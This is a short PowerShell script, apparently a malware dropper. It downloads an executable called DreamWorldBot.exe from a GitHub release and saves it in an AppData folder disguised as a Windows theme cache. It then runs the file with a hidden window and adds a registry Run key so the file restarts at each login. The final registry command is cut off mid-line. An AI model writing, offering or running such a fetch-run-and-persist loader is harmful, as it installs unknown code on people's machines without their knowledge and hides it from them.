$url='https://github.com/Xryakva/Tetst/releases/download/1.11.0/DreamWorldBot.exe'
$dir=Join-Path $env:APPDATA 'Microsoft\Windows\Themes\Cache'
New-Item $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
$dest=Join-Path $dir 'DreamWorldBot.exe'
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process -FilePath $dest -WindowStyle Hidden
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DreamWorldBot /t REG_SZ /d $dest /
